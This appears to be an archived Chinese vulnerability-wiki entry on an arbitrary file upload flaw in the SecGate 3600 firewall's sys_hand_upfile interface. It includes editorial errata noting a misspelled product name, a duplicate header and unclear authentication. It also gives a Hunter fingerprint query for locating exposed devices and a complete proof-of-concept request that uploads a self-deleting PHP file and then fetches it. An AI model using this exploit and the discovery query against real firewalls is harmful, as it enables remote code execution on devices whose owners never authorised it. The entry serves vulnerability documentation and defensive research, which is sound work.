---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "网神SecGata3600防火墙sys_hand_upfile任意文件上传漏洞"
product: "网神SecGate3600"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "上传无Cookie但后续读取带session，认证条件未分清；应期望12321回显并补响应，缺版本和修复"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%BD%91%E7%A5%9ESecGata3600%E9%98%B2%E7%81%AB%E5%A2%99sys_hand_upfile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "app.name="
hunter: "app.name=\"网神 SecGate\"&&web.title==\"网神SecGate 3600防火墙\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zbdg597pe4ckn0gk"
id: "vw-51408e7ceb3aa9003d1811c9"
entity_id: "ve-51408e7ceb3aa9003d1811c9"
schema_version: "1"
---

# 网神SecGata3600防火墙sys_hand_upfile任意文件上传漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：网神SecGate3600
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：上传无Cookie但后续读取带session，认证条件未分清；应期望12321回显并补响应，缺版本和修复
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题SecGata拼错SecGate
2. Hunter存FOFA且app.name=截断
3. 上传无Cookie但后续读取带session，认证条件未分清
4. 自删除只有代码意图未验证执行后消失
5. 应期望12321回显并补响应，缺版本和修复
6. 重复Connection头及固定长度

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/zbdg597pe4ckn0gk>

### 归档技术正文

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">网神 SecGate 3600 防火墙 sys_hand_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 网神SecGata 3600防火墙

# 三、资产测绘
    - hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"`


+ 登录页面


# 四、漏洞复现
```plain
POST /?g=sys_hand_upfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
Content-Length: 261
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=cmqfdwckb52z6zvzzjgm
Connection: close

--cmqfdwckb52z6zvzzjgm
Content-Disposition: form-data; name="upfile"; filename="7litvvzvnk.php"

<?php echo 111*111;unlink(__FILE__);?>
--cmqfdwckb52z6zvzzjgm
Content-Disposition: form-data; name="submit_post"

sys_hand_upfile
--cmqfdwckb52z6zvzzjgm--
```


上传文件位置

```plain
GET /attachements/7litvvzvnk.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
Connection: close
Cookie: __s_sessionid__=jvdi0lqirs2c3ilvut5t2qluv6
Accept-Encoding: gzip, deflate
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zbdg597pe4ckn0gk>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
